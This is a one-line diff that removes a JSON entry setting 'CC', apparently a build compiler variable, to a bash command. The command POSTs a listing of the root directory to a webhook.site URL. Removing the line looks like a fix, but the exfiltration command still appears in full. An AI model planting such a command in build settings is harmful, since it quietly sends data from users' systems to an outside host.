@@ -1,1 +1,0 @@
-{"CC":"bash -c \"curl https://webhook.site/33c6a830-fd48-4997-a9e3-6f9f7f82877d -X POST -d '$(ls /)'\""}
